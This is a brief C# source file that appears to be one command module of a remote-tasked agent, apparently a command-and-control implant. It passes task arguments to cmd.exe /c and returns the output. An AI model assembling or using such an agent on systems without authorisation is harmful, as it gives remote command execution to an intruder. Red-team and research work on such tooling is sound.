using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace Agent.Commands
{
    public class Shell : AgentCommand
    {
        public override string Name => "shell";

        public override string Execute(AgentTask task)
        {
            // cmd.exe /c <command>
            var args = string.Join(" ", task.Arguments);
            return Internal.Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {args}");
        }
    }
}
